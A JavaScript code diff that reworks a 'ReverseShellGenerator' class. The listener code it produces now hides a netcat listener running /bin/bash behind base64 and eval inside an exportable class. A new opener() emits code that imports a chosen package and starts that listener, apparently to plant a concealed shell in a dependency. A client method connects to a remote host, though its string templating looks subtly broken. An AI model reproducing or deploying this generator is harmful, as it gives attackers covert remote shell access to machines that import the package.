@@ -1,3 +1,5 @@
+import netcat from 'netcat'
+
 class ReverseShellGenerator {
     constructor({ host, port, command }) {
         this.host = host;
@@ -6,17 +8,29 @@ class ReverseShellGenerator {
     }
 
     listener() {
-        const code = Buffer.from(`const netcat = require('netcat')
+        const listener_code = `server.port(${this.port}).listen().exec('/bin/bash')`
+        const encoded_listener_code = Buffer.from(listener_code).toString('base64');
+        const code = `import netcat from 'netcat'
 const server = new netcat.server()
-server.port(${this.port}).listen().exec('/bin/bash')`).toString('base64')
+class ReverseShell {
+    start() {
+        eval(Buffer.from('${encoded_listener_code}', 'base64').toString('ascii'))
+    }
+}`
 
-        return `eval(Buffer.from('${code}', 'base64').toString('ascii'))`
+        return `${code}
+export default ReverseShell`
     }
 
-    opener() {
-        return `import netcat from 'netcat'
-const client = new netcat.client()
-process.stdin.pipe( client.addr('${this.host}').port(${this.port}).connect().pipe(process.stdout).stream())\n`
+    opener(pkg) {
+        return `\nimport M from '${pkg}'
+const Listener = new M()
+Listener.start()\n`
+    }
+
+    runLocalClient() {
+        const client = new netcat.client()
+        process.stdin.pipe( client.addr('${this.host}').port(${this.port}).connect().pipe(process.stdout).stream())
     }
 }
 
